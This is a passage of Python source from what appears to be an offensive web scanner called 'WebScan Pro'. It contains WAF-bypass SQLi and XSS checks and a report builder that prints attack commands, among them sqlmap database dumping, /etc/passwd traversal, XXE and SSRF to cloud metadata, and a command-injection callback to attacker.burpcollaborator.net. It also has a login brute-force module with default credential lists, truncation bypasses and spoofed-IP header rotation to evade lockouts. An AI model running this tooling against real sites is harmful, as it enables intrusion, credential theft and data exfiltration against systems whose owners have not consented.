                 "sql error","odbc","unclosed quotation","syntax error"]
    _bypassed = threading.Event()

    def _test_bypass(param, payload, ptype):
        if _bypassed.is_set(): return
        tp = dict(params); tp[param] = [payload]
        test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
        try:
            r = rget(test_url, timeout=TIMEOUT)
            body_low = r.text.lower()
            if ptype == "sqli":
                if any(err in body_low for err in DB_ERRORS):
                    _bypassed.set()
                    vuln(f"WAF bypass successful! SQLi error returned with payload: {payload[:50]}", "Critical")
                    add("sqli", {
                        "severity": "Critical",
                        "confirmed": True,
                        "title": f"WAF Bypass SQLi — Obfuscated Payload Succeeded",
                        "description": f"WAF bypass technique succeeded. SQL error returned with obfuscated payload: {payload[:100]}. The WAF can be circumvented.",
                        "recommendation": "Review WAF rules. Enable anomaly detection. Use parameterized queries regardless of WAF.",
                        "url": test_url,
                        "evidence": f"Bypass payload: {payload[:100]}",
                    })
            elif ptype == "xss":
                if payload in r.text or payload.lower() in r.text.lower():
                    _bypassed.set()
                    vuln(f"WAF bypass successful! XSS reflected with payload: {payload[:50]}", "High")
                    add("xss", {
                        "severity": "High",
                        "confirmed": True,
                        "title": f"WAF Bypass XSS — Obfuscated Payload Reflected",
                        "description": f"WAF bypass technique succeeded. XSS payload reflected with obfuscation: {payload[:100]}.",
                        "recommendation": "Update WAF rules to cover obfuscated payloads. Implement input validation server-side.",
                        "url": test_url,
                        "evidence": f"Bypass payload: {payload[:100]}",
                    })
        except Exception: pass

    tasks = []
    for param in list(params.keys())[:3]:
        for p in WAF_BYPASS_SQLI: tasks.append((param, p, "sqli"))
        for p in WAF_BYPASS_XSS:  tasks.append((param, p, "xss"))

    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(_test_bypass, p, pl, t) for p, pl, t in tasks]
        for f in as_completed(futs): _pass(f)

    if not _bypassed.is_set():
        good("WAF bypass: no successful bypass found")
    _module_done("waf_bypass")


# ═══════════════════════════════════════════════════════════════════════
#  EXPERT VALIDATION REPORT (4th Report)
# ═══════════════════════════════════════════════════════════════════════

# WSTG/ASVS badge helper (used in _render_findings)
def _wstg_badge(cat):
    meta = CAT_META.get(cat, {})
    wstg = meta.get("wstg","")
    asvs = meta.get("asvs","")
    badges = ""
    if wstg:
        badges += f'<span class="wstg-badge" title="OWASP Web Security Testing Guide">{wstg}</span> '
    if asvs:
        badges += f'<span class="asvs-badge" title="Application Security Verification Standard">{asvs}</span>'
    return badges

def _get_expert_commands(cat, item, target_url):
    """Generate manual verification commands for a finding."""
    sev   = item.get("severity","Info")
    title = item.get("title","")
    furl  = item.get("url", target_url)
    param = item.get("param","id")
    db    = item.get("db_type","MySQL")

    parsed = urlparse(furl)
    domain = parsed.hostname or urlparse(target_url).hostname or ""

    commands = []

    if cat == "sqli":
        commands = [
            {
                "tool": "sqlmap",
                "desc": "Automated SQLi exploitation and database dumping",
                "cmd": f'sqlmap -u "{furl}" --dbs --batch --level=3 --risk=2 --random-agent --timeout=10',
            },
            {
                "tool": "sqlmap (forms)",
                "desc": "Test all form inputs for SQLi",
                "cmd": f'sqlmap -u "{target_url}" --forms --dbs --batch --crawl=2 --random-agent',
            },
            {
                "tool": "curl (manual error-based)",
                "desc": "Quick manual check for SQL error",
                "cmd": f"curl -s '{furl}&{param}=%27' | grep -iE 'sql|error|warning|mysql|syntax'",
            },
            {
                "tool": "curl (time-based blind)",
                "desc": "Confirm time-based blind SQLi",
                "cmd": f"time curl -s '{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}=%27+AND+SLEEP(5)--+-'",
            },
        ]
    elif cat == "xss":
        commands = [
            {
                "tool": "curl",
                "desc": "Verify XSS reflection",
                "cmd": f"curl -s '{furl}&{param}=<script>alert(1)</script>' | grep -iE 'script|alert'",
            },
            {
                "tool": "dalfox",
                "desc": "Advanced XSS scanner and exploitation",
                "cmd": f'dalfox url "{furl}" --follow-redirects --timeout 10',
            },
            {
                "tool": "curl (bypass attempts)",
                "desc": "Test WAF bypass XSS payloads",
                "cmd": f"curl -s '{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}=<svg/onload=alert(1)>' | grep -iE 'svg|onload|alert'",
            },
        ]
    elif cat == "lfi":
        commands = [
            {
                "tool": "curl",
                "desc": "Test path traversal",
                "cmd": f"curl -s '{furl}&{param}=../../../../etc/passwd' | grep -iE 'root:|daemon:|/bin/'",
            },
            {
                "tool": "curl (encoded)",
                "desc": "URL-encoded LFI bypass",
                "cmd": f"curl -s '{furl}&{param}=..%2F..%2F..%2Fetc%2Fpasswd' | grep -iE 'root:|daemon:'",
            },
        ]
    elif cat == "ssrf":
        commands = [
            {
                "tool": "curl (AWS metadata)",
                "desc": "Test SSRF to AWS metadata service",
                "cmd": f"curl -s '{furl}&{param}=http://169.254.169.254/latest/meta-data/' | grep -iE 'ami-id|instance'",
            },
            {
                "tool": "curl (localhost probe)",
                "desc": "Test SSRF to localhost services",
                "cmd": f"curl -s '{furl}&{param}=http://127.0.0.1:22/' | grep -vE '404|not found'",
            },
        ]
    elif cat == "cmdi":
        commands = [
            {
                "tool": "curl",
                "desc": "Test command injection",
                "cmd": f"curl -s '{furl}&{param}=test%3Bid' | grep -iE 'uid=|gid=|root|www-data'",
            },
            {
                "tool": "curl (OOB via DNS)",
                "desc": "Test blind CMDi with DNS callback",
                "cmd": f"curl -s '{furl}&{param}=`nslookup+attacker.burpcollaborator.net`'",
            },
        ]
    elif cat == "xxe":
        commands = [
            {
                "tool": "curl",
                "desc": "Test XXE with external entity",
                "cmd": (f"curl -s -X POST '{furl}'"
                        " -H 'Content-Type: application/xml'"
                        " -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'"
                        " | grep -iE 'root:|daemon:'"),
            },
        ]
    elif cat == "ports":
        port = item.get("port", "")
        commands = [
            {
                "tool": "nmap",
                "desc": "Full service version scan on discovered ports",
                "cmd": f"nmap -sV -sC -p {port} {domain} --open",
            },
            {
                "tool": "nmap (vuln scripts)",
                "desc": "Run vulnerability detection scripts",
                "cmd": f"nmap --script vuln -p {port} {domain}",
            },
        ]
    elif cat == "ssl_tls":
        commands = [
            {
                "tool": "testssl.sh",
                "desc": "Comprehensive SSL/TLS analysis",
                "cmd": f"./testssl.sh {domain}",
            },
            {
                "tool": "nmap (ssl-enum)",
                "desc": "Enumerate SSL ciphers",
                "cmd": f"nmap --script ssl-enum-ciphers -p 443 {domain}",
            },
            {
                "tool": "openssl",
                "desc": "Check certificate details",
                "cmd": f"openssl s_client -connect {domain}:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text",
            },
        ]
    elif cat == "cors":
        commands = [
            {
                "tool": "curl",
                "desc": "Test CORS with arbitrary origin",
                "cmd": f"curl -sI -H 'Origin: https://evil.com' '{furl}' | grep -iE 'access-control|origin'",
            },
            {
                "tool": "cors-scanner",
                "desc": "Automated CORS misconfiguration testing",
                "cmd": f"python3 cors_scanner.py -u '{furl}' -v",
            },
        ]
    elif cat in ("cloud_bucket", "s3_brute"):
        commands = [
            {
                "tool": "aws cli",
                "desc": "List bucket contents",
                "cmd": f"aws s3 ls s3://{domain}/ --no-sign-request 2>&1",
            },
            {
                "tool": "aws cli (download)",
                "desc": "Download bucket contents",
                "cmd": f"aws s3 sync s3://{domain}/ ./bucket_dump/ --no-sign-request 2>&1",
            },
        ]
    elif cat == "jwt":
        commands = [
            {
                "tool": "jwt_tool",
                "desc": "Test JWT vulnerabilities (alg:none, RS/HS confusion)",
                "cmd": f"python3 jwt_tool.py <token_here> -M at -t '{target_url}' -rc 'Authorization: Bearer <token>'",
            },
        ]
    elif cat == "sqli" and "time" in title.lower():
        commands = [
            {
                "tool": "sqlmap (time-based)",
                "desc": "Exploit time-based blind SQLi",
                "cmd": f'sqlmap -u "{furl}" -p "{param}" --technique=T --dbms="{db}" --batch --dbs',
            },
        ]
    elif cat == "cve_scan":
        tech = re.search(r"CVE Match: ([\w]+)", title)
        tech_name = tech.group(1) if tech else "component"
        commands = [
            {
                "tool": "nmap (vuln scripts)",
                "desc": f"Check known CVEs for {tech_name}",
                "cmd": f"nmap --script vuln -p 80,443,8080 {domain}",
            },
            {
                "tool": "nuclei",
                "desc": "Run CVE templates against target",
                "cmd": f"nuclei -u '{target_url}' -t cves/ -severity high,critical",
            },
        ]
    else:
        # Generic commands
        commands = [
            {
                "tool": "curl",
                "desc": "Manual verification request",
                "cmd": f"curl -v '{furl}' -H 'User-Agent: Mozilla/5.0'",
            },
            {
                "tool": "nmap",
                "desc": "Service and vulnerability scan",
                "cmd": f"nmap -sV --script vuln {domain}",
            },
        ]

    return commands


def _build_expert_report(target, out_path):
    """Build the Expert Validation Report — 4th report with manual verification commands."""
    ts_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    counts = _sev_counts()
    total  = _total()
    score  = _risk_score()

    # Only include Critical and High findings in expert report
    expert_findings = []
    for cat, items in FINDINGS.items():
        for item in items:
            sev = item.get("severity","Info")
            if sev in ("Critical","High"):
                meta = CAT_META.get(cat, {})
                icon, label = CAT_TITLES.get(cat, ("🔍", cat.upper()))
                expert_findings.append({
                    **item,
                    "_cat": cat,
                    "_icon": icon,
                    "_label": label,
                    "_owasp": meta.get("owasp",""),
                    "_owasp_name": meta.get("owasp_name",""),
                    "_cwe": meta.get("cwe",""),
                    "_cvss": meta.get("cvss",0.0),
                    "_biz": meta.get("biz",""),
                })

    sev_order = {"Critical":0,"High":1}
    expert_findings.sort(key=lambda x: sev_order.get(x.get("severity","High"),2))

    findings_html = ""
    for idx, f in enumerate(expert_findings, 1):
        sev   = f.get("severity","High")
        col   = "#e74c3c" if sev == "Critical" else "#e67e22"
        title = f.get("title", f.get("url","Finding"))
        desc  = f.get("description","")
        evid  = f.get("evidence","")
        rec   = f.get("recommendation","")
        owasp = f.get("_owasp","")
        cwe   = f.get("_cwe","")
        cvss  = f.get("_cvss",0.0)
        biz   = f.get("_biz","")
        label = f.get("_label","")
        icon  = f.get("_icon","🔍")
        is_confirmed = f.get("confirmed", False)
        conf_txt = "✅ CONFIRMED" if is_confirmed else "⚠️ POTENTIAL"
        conf_col = "#27ae60" if is_confirmed else "#e67e22"

        # Generate verification commands
        commands = _get_expert_commands(f.get("_cat",""), f, target)
        cmd_html = ""
        for cmd_info in commands:
            cmd_html += f"""
              <div class="cmd-block">
                <div class="cmd-tool">🔧 {cmd_info['tool']}</div>
                <div class="cmd-desc">{cmd_info['desc']}</div>
                <pre class="cmd-code">{cmd_info['cmd']}</pre>
              </div>"""

        findings_html += f"""
    <div class="expert-finding" id="f{idx}">
      <div class="ef-header" style="border-left:5px solid {col}">
        <div class="ef-num">#{idx}</div>
        <div class="ef-info">
          <div class="ef-title">{icon} [{label}] {title}</div>
          <div class="ef-badges">
            <span class="badge" style="background:{col}">{sev}</span>
            <span class="badge" style="background:{conf_col}">{conf_txt}</span>
            {'<span class="badge badge-owasp">' + owasp + '</span>' if owasp else ''}
            {'<span class="badge badge-cwe">' + cwe + '</span>' if cwe else ''}
            {'<span class="badge badge-cvss">CVSS ' + str(cvss) + '</span>' if cvss else ''}
          </div>
        </div>
      </div>
      <div class="ef-body">
        {'<div class="ef-section"><b>Description:</b><p>' + desc + '</p></div>' if desc else ''}
        {'<div class="ef-section evid"><b>Evidence:</b><p>' + evid + '</p></div>' if evid else ''}
        {'<div class="ef-section biz"><b>Business Impact:</b><p>' + biz + '</p></div>' if biz else ''}
        {'<div class="ef-section rec"><b>Remediation:</b><p>' + rec + '</p></div>' if rec else ''}
        <div class="ef-section cmds">
          <b>🔬 Expert Verification Commands</b>
          <p class="warn-note">⚠️ Run these only on systems you own or have written permission to test.</p>
          {cmd_html if cmd_html else '<p class="muted">No specific verification commands for this finding type.</p>'}
        </div>
      </div>
    </div>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WebScan Pro v{VERSION} — Expert Validation Report — {target}</title>
<style>
  :root{{--bg:#0a0e1a;--card:#111827;--border:#1f2d40;--text:#e2e8f0;--accent:#60a5fa;--muted:#64748b}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,monospace;padding:2rem 1rem;line-height:1.6}}
  .container{{max-width:1100px;margin:0 auto}}
  .header{{background:linear-gradient(135deg,#1e3a5f,#111827);border:1px solid #1e40af;border-radius:12px;padding:2rem;margin-bottom:2rem}}
  h1{{color:#60a5fa;font-size:1.6rem;margin-bottom:.3rem}}
  .subtitle{{color:#94a3b8;font-size:.9rem}}
  .meta{{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1rem}}
  .meta-item{{background:#0f172a;border:1px solid var(--border);border-radius:6px;padding:.4rem .8rem;font-size:.8rem}}
  .meta-item b{{color:var(--accent)}}
  .summary-row{{display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:2rem}}
  .sc{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem 1.5rem;text-align:center;min-width:100px}}
  .sc .n{{font-size:2rem;font-weight:700}}
  .c{{color:#ef4444}}.h{{color:#f97316}}.sc-score{{color:#60a5fa}}
  .expert-finding{{background:var(--card);border:1px solid var(--border);border-radius:10px;margin-bottom:1.5rem;overflow:hidden}}
  .ef-header{{display:flex;align-items:flex-start;gap:1rem;padding:1rem 1.2rem;background:#0f172a}}
  .ef-num{{font-size:1.3rem;font-weight:900;color:var(--accent);min-width:2rem}}
  .ef-title{{font-weight:700;font-size:.95rem;margin-bottom:.4rem}}
  .ef-badges{{display:flex;gap:.4rem;flex-wrap:wrap}}
  .badge{{border-radius:4px;padding:.15rem .5rem;font-size:.7rem;font-weight:700;color:#fff}}
  .badge-owasp{{background:#1e40af}}.badge-cwe{{background:#065f46}}.badge-cvss{{background:#7c3aed}}
  .ef-body{{padding:1.2rem}}
  .ef-section{{margin-bottom:1rem;font-size:.88rem}}
  .ef-section b{{display:block;color:var(--accent);margin-bottom:.3rem;font-size:.9rem}}
  .ef-section p{{color:#cbd5e1;padding:.4rem;background:#0f172a;border-radius:4px;border-left:3px solid var(--border)}}
  .wstg-badge{{background:#1a3a5c;color:#58a6ff;border:1px solid #58a6ff;border-radius:3px;padding:1px 5px;font-size:11px;margin-right:3px;font-family:monospace}}
  .asvs-badge{{background:#1a3a1a;color:#50fa7b;border:1px solid #50fa7b;border-radius:3px;padding:1px 5px;font-size:11px;font-family:monospace}}
  .ef-section.evid p{{border-left-color:#3b82f6;color:#93c5fd}}
  .ef-section.biz p{{border-left-color:#f59e0b;color:#fcd34d}}
  .ef-section.rec p{{border-left-color:#10b981;color:#6ee7b7}}
  .ef-section.cmds{{background:#0a0e1a;border:1px solid #1e3a5f;border-radius:8px;padding:1rem;margin-top:.5rem}}
  .ef-section.cmds b{{color:#f0abfc;font-size:.95rem}}
  .cmd-block{{background:#0f172a;border:1px solid #1e3a5f;border-radius:6px;padding:.8rem;margin:.6rem 0}}
  .cmd-tool{{color:#a78bfa;font-weight:700;font-size:.85rem;margin-bottom:.2rem}}
  .cmd-desc{{color:#94a3b8;font-size:.8rem;margin-bottom:.4rem}}
  .cmd-code{{background:#020617;color:#86efac;font-family:'Courier New',monospace;font-size:.82rem;padding:.6rem .8rem;border-radius:4px;overflow-x:auto;white-space:pre;border-left:3px solid #10b981}}
  .warn-note{{color:#fbbf24;font-size:.78rem;padding:.3rem .5rem;background:#451a03;border-radius:3px;margin:.3rem 0}}
  .muted{{color:var(--muted);font-style:italic}}
  .toc{{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:1rem 1.5rem;margin-bottom:2rem}}
  .toc h3{{color:var(--accent);margin-bottom:.6rem;font-size:1rem}}
  .toc a{{color:#94a3b8;text-decoration:none;font-size:.85rem;display:block;padding:.15rem 0}}
  .toc a:hover{{color:var(--accent)}}
  .section-title{{font-size:1.1rem;font-weight:700;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:.4rem;margin-bottom:1rem}}
  footer{{text-align:center;color:var(--muted);font-size:.75rem;margin-top:2rem;padding-top:1rem;border-top:1px solid var(--border)}}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>🔬 Expert Validation Report</h1>
    <div class="subtitle">WebScan Pro v{VERSION} — Manual Verification Guide for Security Experts</div>
    <div class="meta">
      <div class="meta-item"><b>Target:</b> {target}</div>
      <div class="meta-item"><b>Generated:</b> {ts_str}</div>
      <div class="meta-item"><b>Critical/High Findings:</b> {len(expert_findings)}</div>
      <div class="meta-item"><b>Risk Score:</b> {score}/100</div>
    </div>
  </div>

  <div class="summary-row">
    <div class="sc"><div class="n sc-score">{score}</div><div>Risk Score</div></div>
    <div class="sc"><div class="n">{total}</div><div>Total</div></div>
    <div class="sc"><div class="n c">{counts.get('Critical',0)}</div><div>Critical</div></div>
    <div class="sc"><div class="n h">{counts.get('High',0)}</div><div>High</div></div>
    <div class="sc"><div class="n">{len(expert_findings)}</div><div>In Report</div></div>
  </div>

  <div class="toc">
    <h3>📋 Table of Contents (Critical & High Only)</h3>
    {''.join(f'<a href="#f{i+1}">{i+1}. [{f["_label"]}] {f.get("title","Finding")[:70]}...</a>' for i, f in enumerate(expert_findings))}
  </div>

  <div class="section-title">Critical & High Findings — Expert Verification</div>

  {findings_html if findings_html else '<div style="color:#64748b;padding:2rem;text-align:center">No Critical or High findings to report.</div>'}

  <footer>WebScan Pro v{VERSION} Expert Report — For authorized security testing only. OWASP Top 10 (2021) · CVSS v3.1</footer>
</div>
</body>
</html>"""

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)

# ═══════════════════════════════════════════════════════════════════
#  MODULE 72 — EXPERT LOGIN BRUTE-FORCE (All 4 Levels)
#  Level 1: 500+ default creds + SQL truncation + Unicode bypass
#  Level 2: Smart form detect, CSRF token, password spray,
#            credential stuffing, response baseline, lockout recovery
#  Level 3: IP rotation, session rotation, timing attack,
#            CAPTCHA detect, 2FA-aware
#  Level 4: JWT secret brute-force, API key brute, GraphQL batch
# ═══════════════════════════════════════════════════════════════════
def login_bruteforce_scan(url, combo_file=None, spray_pass=None,
                          custom_user=None, wordlist=None):
    if _module_skip("login_brute"):
        info("Skipping Login Brute-Force (already done)"); return
    section("MODULE 72 — EXPERT LOGIN BRUTE-FORCE (L1–L4)", "🔑")

    import hashlib, base64 as _b64, hmac as _hmac

    parsed  = urlparse(url)
    base    = f"{parsed.scheme}://{parsed.netloc}"
    found   = False   # tracks any success this module

    # ── LEVEL 1 — Extended Default Credentials ───────────────────
    DEFAULT_CREDS = [
        # Generic
        ("admin","admin"),("admin","password"),("admin","1234"),("admin","12345"),
        ("admin","123456"),("admin","admin123"),("admin","pass"),("admin",""),
        ("admin","admin@123"),("admin","Admin@123"),("admin","P@ssw0rd"),
        ("admin","changeme"),("admin","letmein"),("admin","secret"),
        ("admin","qwerty"),("admin","abc123"),("admin","iloveyou"),
        ("admin","monkey"),("admin","dragon"),("admin","master"),
        ("admin","login"),("admin","welcome"),("admin","shadow"),
        ("admin","sunshine"),("admin","princess"),("admin","football"),
        ("administrator","administrator"),("administrator","admin"),
        ("administrator","password"),("administrator","1234"),
        ("root","root"),("root","toor"),("root","password"),
        ("root","admin"),("root",""),("root","alpine"),
        ("user","user"),("user","password"),("user","1234"),
        ("guest","guest"),("guest","password"),("guest",""),
        ("test","test"),("test","password"),("test","1234"),
        ("demo","demo"),("demo","password"),("demo","demo123"),
        # CMS
        ("admin","wordpress"),("admin","joomla"),("admin","drupal"),
        ("wp-admin","wp-admin"),("webmaster","webmaster"),
        ("admin","magento"),("admin","opencart"),("admin","prestashop"),
        # Databases
        ("sa","sa"),("sa","password"),("sa",""),("sa","admin"),
        ("postgres","postgres"),("postgres","password"),("postgres",""),
        ("mysql","mysql"),("dbadmin","dbadmin"),("oracle","oracle"),
        ("mongodb","mongodb"),("redis","redis"),("elastic","elastic"),
        # Network / IoT
        ("cisco","cisco"),("cisco","admin"),("enable","enable"),
        ("manager","manager"),("operator","operator"),("support","support"),
        ("pi","raspberry"),("ubnt","ubnt"),("admin","1111"),
        ("admin","0000"),("admin","888888"),("666666","666666"),
        ("admin","huawei"),("admin","zte"),("admin","1234567890"),
        # Services
        ("jenkins","jenkins"),("grafana","grafana"),("kibana","kibana"),
        ("elastic","changeme"),("admin","grafana"),("admin","Grafana"),
        ("tomcat","tomcat"),("tomcat","s3cret"),("manager","s3cret"),
        ("sonar","sonar"),("nexus","nexus"),("admin","nexus"),
        ("zabbix","zabbix"),("nagios","nagios"),("admin","nagios"),
        ("gitlab","gitlab"),("admin","gitlab"),("portainer","portainer"),
        ("minio","minio123"),("admin","minio"),
        # Common weak passwords
        ("admin","111111"),("admin","000000"),("admin","999999"),
        ("admin","123123"),("admin","abc123"),("admin","pass123"),
        ("admin","test123"),("admin","root123"),("admin","admin1"),
        ("admin","admin2"),("admin","admin3"),("admin","1"),
        ("admin","12"),("admin","123"),("admin","1234"),
        ("admin","12345"),("admin","654321"),("admin","7777777"),
    ]

    # SQL truncation bypass payloads
    SQL_TRUNCATION = [
        ("admin               x", "anything"),
        ("admin\x00",             "anything"),
        ("admin%00",              "anything"),
        ("admin '-- -",           "anything"),
    ]

    # Unicode/case normalization bypass
    UNICODE_BYPASS = [
        ("ａｄｍｉｎ", "admin"),  # ａｄｍｉｎ fullwidth
        ("ADMIN",  "admin"),
        ("Admin",  "admin"),
        ("AdMiN",  "admin"),
    ]

    # ── LEVEL 3 — IP Rotation Header pool ────────────────────────
    _FAKE_IPS = [
        "10.0.0.1","192.168.1.1","172.16.0.1","127.0.0.1",
        "1.1.1.1","8.8.8.8","203.0.113.1","198.51.100.5",
        "185.199.108.1","104.16.0.1","13.32.0.1","52.84.0.1",
    ]
    _ip_idx = [0]

    def _rotated_headers():
        ip = _FAKE_IPS[_ip_idx[0] % len(_FAKE_IPS)]
        _ip_idx[0] += 1
        return {
            "X-Forwarded-For":    ip,
            "X-Real-IP":          ip,
            "X-Originating-IP":   ip,
            "X-Remote-IP":        ip,
            "X-Client-IP":        ip,
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            ]),
        }

    # ── CAPTCHA Detection ─────────────────────────────────────────
    def _has_captcha(html):
        low = html.lower()
        return any(x in low for x in [
            "g-recaptcha","recaptcha","hcaptcha","captcha",
            "turnstile","cf-turnstile","arkose","funcaptcha",
            "data-sitekey","challenge-platform",
        ])

    # ── Smart Login Form Detection (Level 2) ─────────────────────
    LOGIN_PATHS = [
        "/login","/admin/login","/wp-login.php","/administrator/",
        "/admin/","/panel/login","/user/login","/auth/login",
        "/signin","/account/login","/portal/login","/member/login",
        "/api/login","/api/auth","/auth","/session/new",
        "/users/sign_in","/accounts/login","/cp/login",
        "/webmail","/roundcube","/owa","/exchange",
    ]
    LOGIN_FIELD_PAIRS = [
        ("username","password"),("user","pass"),("email","password"),
        ("login","password"),("uname","passwd"),("usr","pwd"),
        ("username","passwd"),("user_name","password"),
        ("log","pwd"),("j_username","j_password"),
        ("name","password"),("account","password"),
    ]

    def _find_login_form(target_url):
        """HTML parse করে login form + CSRF token খোঁজে"""
        try:
            r = rget(target_url, timeout=8, headers=_rotated_headers())
            if r.status_code not in (200, 301, 302, 403):
                return None, None, None, None
            html = r.text
            if not any(x in html.lower() for x in
                       ["password","login","signin","username","email"]):
                return None, None, None, None

            # Detect CAPTCHA
            if _has_captcha(html):
                warn(f"CAPTCHA detected at {target_url} — brute-force skipped for this form")
                return None, None, None, "captcha"

            # Extract form action
            action_m = re.search(
                r'<form[^>]+action=["\']([^"\']*)["\']', html, re.I)
            action = action_m.group(1) if action_m else target_url
            if action and not action.startswith("http"):
                action = base + ("/" if not action.startswith("/") else "") + action.lstrip("/")

            # Detect user/pass field names
            user_field = "username"; pass_field = "password"
            user_m = re.search(
                r'<input[^>]+name=["\']([^"\']*(?:user|login|email|uname|usr|log)[^"\']*)["\']',
                html, re.I)
            pass_m = re.search(
                r'<input[^>]+type=["\']password["\'][^>]+name=["\']([^"\']+)["\']'
                r'|<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']password["\']',
                html, re.I)
            if user_m: user_field = user_m.group(1)
            if pass_m: pass_field = pass_m.group(1) or pass_m.group(2)

            # Extract CSRF token
            csrf_token = None; csrf_field = None
            csrf_m = re.search(
                r'<input[^>]+name=["\']([^"\']*(?:csrf|token|_token|nonce|authenticity)[^"\']*)["\'][^>]+value=["\']([^"\']+)["\']'
                r'|<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']([^"\']*(?:csrf|token|_token|nonce|authenticity)[^"\']*)["\']',
                html, re.I)
            if csrf_m:
                g = csrf_m.groups()
                csrf_field = g[0] or g[3]
                csrf_token = g[1] or g[2]

            return action, user_field, pass_field, (csrf_field, csrf_token)
        except Exception:
            return None, None, None, None

    def _get_baseline(login_url, user_field, pass_field, csrf_info):
        """Wrong password-এর baseline response নেয়"""
        try:
            data = {user_field: "ZZZINVALIDUSERZZZ", pass_field: "ZZZINVALIDPASSZZZ"}
            if csrf_info and csrf_info[0]:
                data[csrf_info[0]] = csrf_info[1] or ""
            r = rpost(login_url, data=data, timeout=8,
                      headers=_rotated_headers(), allow_redirects=True)
            return r.status_code, len(r.content), r.url
        except Exception:
            return 200, 0, login_url

    def _is_success(r, baseline_status, baseline_size, baseline_url):
        """Response baseline comparison — false positive কমায়"""
        body_low = r.text.lower()
        # Explicit failure indicators
        if any(x in body_low for x in [
            "invalid","wrong","incorrect","failed","error",
            "try again","bad credentials","unauthorized",
            "authentication failed","login failed","مجاز نیست",
        ]):
            return False
        # Explicit success indicators
        if any(x in body_low for x in [
            "logout","log out","sign out","dashboard","welcome",
            "profile","my account","admin panel","panel","success",
        ]):
            return True
        # Response size change (success pages are usually bigger)
        size_diff = abs(len(r.content) - baseline_size)
        if size_diff > 500 and r.status_code == baseline_status:
            return True
        # Redirect to different URL
        if r.url != baseline_url and "login" not in r.url.lower():
            return True
        return False

    def _add_brute_success(user, passwd, login_url, method, evidence):
        nonlocal found
        found = True
        vuln(f"Login SUCCESS [{method}]: {user}:{passwd} at {login_url}", "Critical")
        add("login_brute", {
            "confirmed": True,
            "severity": "Critical",
            "title": f"Login Brute-Force SUCCESS — {user}:{passwd}",
            "url": login_url,
            "description": (
                f"CONFIRMED: Successful login with credentials {user}:{passwd} "
                f"via {method} at {login_url}. "
                f"Evidence: {evidence}"),
            "recommendation": (
                "Change this password immediately. Implement account lockout "
                "after 5 failed attempts. Enable MFA. Use strong password policy "
                "(min 12 chars, mixed case, numbers, symbols)."),
        })

    # ── Find login URL ────────────────────────────────────────────
    info("Searching for login form...")
    login_url = None; user_field = "username"; pass_field = "password"
    csrf_info = None; captcha_found = False

    for path in LOGIN_PATHS:
        action, uf, pf, ci = _find_login_form(base + path)
        if ci == "captcha":
            captcha_found = True; continue
        if action:
            login_url = action; user_field = uf; pass_field = pf; csrf_info = ci
            good(f"Login form found: {base+path} → POST {action}")
            good(f"Fields: user='{user_field}' pass='{pass_field}'" +
                 (f" csrf='{ci[0]}'" if ci and ci[0] else ""))
            break

    if not login_url:
        if captcha_found:
            add("login_brute", {
                "confirmed": False, "severity": "Info",
                "title": "Login Form Protected by CAPTCHA",
                "url": base,
                "description": "CAPTCHA detected on login form — automated brute-force is not feasible without CAPTCHA bypass.",
                "recommendation": "CAPTCHA is a good protection. Ensure it is implemented correctly on all login endpoints.",
            })
        else:
            info("No login form detected — skipping brute-force")
        _module_done("login_brute"); return

    # Baseline response
    info("Measuring baseline response...")
    baseline_status, baseline_size, baseline_url = _get_baseline(
        login_url, user_field, pass_field, csrf_info)
    info(f"Baseline: status={baseline_status} size={baseline_size}B url={baseline_url}")

    # Lockout counter
    lockout_count = [0]
    LOCKOUT_SIGNALS = ["locked","too many","account disabled","blocked",
                       "temporarily","banned","suspended","429"]

    def _check_lockout(r):
        body = r.text.lower()
        return r.status_code == 429 or any(x in body for x in LOCKOUT_SIGNALS)

    def _try_login(username, password, extra_data=None):
        """Single login attempt with IP rotation + session rotation"""
        if found: return False
        try:
            data = {user_field: username, pass_field: password}
            if csrf_info and csrf_info[0] and csrf_info[1]:
                data[csrf_info[0]] = csrf_info[1]
            if extra_data:
                data.update(extra_data)
            hdrs = _rotated_headers()
            # fresh session per attempt
            s = requests.Session()
            if PROXY:
                s.proxies = {"http": PROXY, "https": PROXY}
            r = s.post(login_url, data=data, timeout=10,
                       headers=hdrs, allow_redirects=True,
                       verify=False)
            if _check_lockout(r):
                lockout_count[0] += 1
                if lockout_count[0] >= 2:
                    warn(f"Account lockout detected after attempt — stopping brute-force")
                    return "LOCKOUT"
            if _is_success(r, baseline_status, baseline_size, baseline_url):
                return True
        except Exception:
            pass
        return False

    # ── LEVEL 1: Default Credentials ─────────────────────────────
    info(f"[L1] Testing {len(DEFAULT_CREDS)} default credential pairs...")
    for user, passwd in DEFAULT_CREDS:
        if found: break
        # Use custom user override if provided
        test_user = custom_user if custom_user else user
        result = _try_login(test_user, passwd)
        if result == "LOCKOUT": break
        if result:
            _add_brute_success(test_user, passwd, login_url,
                               "Default Credentials",
                               f"POST {user_field}={test_user} {pass_field}={passwd} → success page detected")
            break
        time.sleep(0.3)

    # SQL truncation bypass
    if not found:
        info("[L1] Testing SQL truncation + Unicode bypass...")
